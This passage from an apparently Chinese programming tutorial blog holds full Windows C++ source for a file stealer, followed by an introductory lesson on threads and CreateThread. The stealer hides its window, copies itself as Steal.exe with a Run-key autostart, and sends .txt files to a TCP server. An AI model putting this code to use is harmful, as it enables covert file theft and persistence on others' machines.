class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;io.h&gt;</span><span class="comment">//_finddata_t</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*该程序被植入到某联网机器中用于窃取文件</span></span><br><span class="line"><span class="comment">*1.搜索被窃取的文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 隐藏自身</span></span><br><span class="line">    <span class="built_in">HideMyself</span>();</span><br><span class="line">    <span class="comment">// 添加到启动项</span></span><br><span class="line">    <span class="built_in">AddToSystem</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TCP Client\n&quot;</span>);</span><br><span class="line">    <span class="comment">//窃取文件</span></span><br><span class="line">    <span class="type">int</span> ret_steal = <span class="built_in">DoSteal</span>(<span class="string">&quot;E:\\About Chase\\Art of Programming-2024\\CPP\\test_f&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szPATH)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1 遍历文件夹</span></span><br><span class="line">    WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件</span></span><br><span class="line">    HANDLE hListFile;<span class="comment">//文件用句柄来标识和编号</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;<span class="comment">//MAX_PATH=260 Windows下的宏，win下最大文件路径长度</span></span><br><span class="line">    <span class="built_in">strcpy</span>(szFilePath, szPATH);</span><br><span class="line">    <span class="built_in">strcat</span>(szFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//字符串拼接</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        FindFirstFileA(	//LP标识指针</span></span><br><span class="line"><span class="comment">            _In_ LPCSTR lpFileName,//入参：路径</span></span><br><span class="line"><span class="comment">            _Out_ LPWIN32_FIND_DATAA lpFindFileData	//输出</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//2 首先找到第一个文件,为 hListFile赋值</span></span><br><span class="line">    hListFile = <span class="built_in">FindFirstFile</span>(szFilePath, &amp;FindFileData);</span><br><span class="line">    <span class="comment">//循环遍历所有文件</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">strcpy</span>(mypath, szPATH);</span><br><span class="line">        <span class="built_in">strcat</span>(mypath, <span class="string">&quot;\\&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(mypath, FindFileData.cFileName);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;FileName:%s\n&quot;</span>, mypath);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(mypath, <span class="string">&quot;.txt&quot;</span>))<span class="comment">//只截取txt文件</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">SendtoServer</span>(mypath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile, &amp;FindFileData));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)<span class="comment">//2 2 表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)<span class="comment">//2表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储时间</span></span><br><span class="line">    <span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 初始化套接字</span></span><br><span class="line">    SOCKET  sock_cli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//TCP ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (sock_cli == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 准备发送地址和端口</span></span><br><span class="line">    SOCKADDR_IN addrServ;</span><br><span class="line">    <span class="type">int</span> szAddrServ = <span class="built_in">sizeof</span>(addrServ);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">44444</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 connect</span></span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);<span class="comment">//将当前时间存入ch</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Begin connect %s\n&quot;</span>, ch);</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sock_cli, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 读取文件内容到buffer</span></span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6 发送数据</span></span><br><span class="line">    <span class="type">int</span> strLen = <span class="built_in">sendto</span>(sock_cli, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (sockaddr*)&amp;addrServ, szAddrServ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After send %d\n&quot;</span>, strLen);</span><br><span class="line">    <span class="keyword">if</span> (strLen == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;send error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After send: %s\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sock_cli);</span><br><span class="line">    <span class="comment">//6 终止套接字</span></span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="comment">//printf(&quot;Error num = %d, Error time %s\n&quot;, ::GetLastError(), ch);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error num = %d, Error time %s\n&quot;</span>, ERRNO, ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HKEY  hKEY;</span><br><span class="line">    <span class="type">char</span>  CurrentPath[MAX_PATH];</span><br><span class="line">    <span class="type">char</span>  SysPath[MAX_PATH];</span><br><span class="line">    <span class="type">long</span>  ret = <span class="number">0</span>;</span><br><span class="line">    LPSTR FileNewName;</span><br><span class="line">    LPSTR FileCurrentName;</span><br><span class="line">    DWORD type = REG_SZ;</span><br><span class="line">    DWORD size = MAX_PATH;</span><br><span class="line">    LPCTSTR Rgspath = <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>; <span class="comment">//regedit  win + R</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemDirectory</span>(SysPath, size);</span><br><span class="line">    <span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, CurrentPath, size);</span><br><span class="line">    <span class="comment">//Copy File</span></span><br><span class="line">    FileCurrentName = CurrentPath;</span><br><span class="line">    FileNewName = <span class="built_in">lstrcat</span>(SysPath, <span class="string">&quot;\\Steal.exe&quot;</span>);<span class="comment">//字符串拼接</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_finddata_t</span> Steal;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ret1 = %d,FileNewName = %s\n&quot;</span>, ret, FileNewName);</span><br><span class="line">    <span class="keyword">if</span> (_findfirst(FileNewName, &amp;Steal) != <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span>;<span class="comment">//已经安装！</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ret2 = %d\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ihow = <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">&quot;该程序只允许用于合法的用途！\n继续运行该程序将使这台机器处于被监控的状态！\n如果您不想这样，请按“取消”按钮退出。\n按下“是”按钮该程序将被复制到您的机器上，并随系统启动自动运行。\n按下“否”按钮，程序只运行一次，不会在您的系统内留下任何东西。&quot;</span>, <span class="string">&quot;警告&quot;</span>, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);</span><br><span class="line">    <span class="keyword">if</span> (ihow == IDCANCEL)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ihow == IDNO)</span><br><span class="line">        <span class="keyword">return</span>;<span class="comment">//只运行一次</span></span><br><span class="line">    <span class="comment">//复制文件</span></span><br><span class="line">    ret = <span class="built_in">CopyFile</span>(FileCurrentName, FileNewName, TRUE);</span><br><span class="line">    <span class="keyword">if</span> (!ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//加入注册表【需要管理员权限】</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">    ret = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, Rgspath, <span class="number">0</span>, KEY_WRITE, &amp;hKEY);</span><br><span class="line">    <span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Set Key</span></span><br><span class="line">    ret = <span class="built_in">RegSetValueEx</span>(hKEY, <span class="string">&quot;Steal&quot;</span>, <span class="literal">NULL</span>, type, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)FileNewName, size);</span><br><span class="line">    <span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 拿到当前的窗口句柄</span></span><br><span class="line">    HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line">    <span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="六-多线程"><a href="#六-多线程" class="headerlink" title="六 多线程"></a>六 多线程</h2><h3 id="6-1基本概念"><a href="#6-1基本概念" class="headerlink" title="6.1基本概念"></a>6.1基本概念</h3><p>引入一个题目：</p><ul><li>老师提了一个需求：打印</li><li>每隔3秒叫小红俯卧撑：持续20次</li><li>每隔4秒钟小明做一次甩头发：持续30次</li><li>每隔2秒钟叫老王唱歌：持续50次</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//老师提了一个需求：打印</span></span><br><span class="line"><span class="comment">//每隔3秒叫小红俯卧撑:持续20次</span></span><br><span class="line"><span class="comment">//每隔4秒钟小明做一次甩头发:持续30次</span></span><br><span class="line"><span class="comment">//每隔2秒钟叫老王唱歌:持续50次</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main_hong</span><span class="params">(<span class="type">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d次俯卧撑\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main_ming</span><span class="params">(<span class="type">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d次甩头\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main_wang</span><span class="params">(<span class="type">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d次唱歌\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count1 = <span class="number">20</span>, count2 = <span class="number">30</span>, count3 = <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">main_hong</span>(count1);</span><br><span class="line">    <span class="built_in">main_ming</span>(count2);</span><br><span class="line">    <span class="built_in">main_wang</span>(count3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>程序顺序执行，执行结束共需要时间为：<code>(3x20 + 4x30 + 2x50)s</code></p></blockquote><p>线程是在进程中产生的一个执行单元，是CPU调度和分配的最小单元，其在同一个进程中与其他线程并行运行，他们可以共享进程内的资源，比如内存、地址空间、打开的文件等等。</p><ul><li><strong>线程</strong>是CPU调度和分派的基本单位【工人】</li><li><strong>进程</strong>是分配资源的基本单位【车间】</li></ul><p><strong>进程</strong>：正在运行的程序【狭义】。</p><p>【广义】进程是处于执行期的程序以及它所管理的资源（如打开的文件、挂起的信号、进程状态、地址空间等等）的总称。从操作系统核心角度来说，进程是操作系统调度除CPU时间片外进行的资源分配和保护的基本单位，它有一个独立的虚拟地址空间，用来容纳进程映像(如与进程关联的程序与数据)，并以进程为单位对各种资源实施保护，如受保护地访问处理器、文件、外部设备及其他进程(进程间通信) 。</p><br><p><span style="background:#5de420;font-weight:700">如何理解进程和线程？</span></p><ul><li><p>计算机有很多资源组成，比如CPU、内存、磁盘、鼠标、键盘等，就像一个工厂由电力系统、作业车间、仓库、管理办公室和工人组成。</p></li><li><p>假定工厂的电力有限，一次只能供给一个或少量几个车间使用。也就是说，一部分车间开工的时候，其他车间都必须停工。背后的含义就是，单个CPU一次只能运行一个任务，多个CPU能够运行少量任务。</p></li><li><p>线程就好比车间里的工人。一个进程可以包括多个线程，他们协同完成某一个任务。</p></li></ul><br><p><span style="background:#5de420;font-weight:700">为什么使用多线程？</span></p><ul><li><p>避免阻塞：单个进程只有一个主线程，当主线程阻塞的时候，整个进程也就阻塞了，无法再去做其它的一些功能了。</p></li><li><p>避免CPU空转：应用程序经常会涉及到RPC，数据库访问，磁盘IO等操作，这些操作的速度比CPU慢很多，而在等待这些响应时，CPU却不能去处理新的请求，导致这种单线程的应用程序性能很差。【 cpu &gt; 内存 &gt; 磁盘】</p></li><li><p>提升效率：一个进程要独立拥有4GB的虚拟地址空间，而多个线程可以共享同一地址空间，线程的切换比进程的切换要快得多。</p><br></li></ul><h3 id="6-2-线程创建函数"><a href="#6-2-线程创建函数" class="headerlink" title="6.2 线程创建函数"></a>6.2 线程创建函数</h3><p><code>CreateThread</code>是一种微软在<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread?devlangs=cpp&f1url=?appId=Dev17IDEF1&l=ZH-CN&k=k(THREAD1%252FCreateThread);k(CreateThread);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">Windows API</a>中提供了建立新的线程的函数，该函数在主线程的基础上创建一个新线程。线程终止运行后，线程对象仍然在系统中，必须通过<code>CloseHandle</code>函数来关闭该线程对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,<span class="comment">//SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwStackSize,<span class="comment">//initialstacksize</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//threadfunction</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,<span class="comment">//threadargument</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,<span class="comment">//creationoption</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpThreadId<span 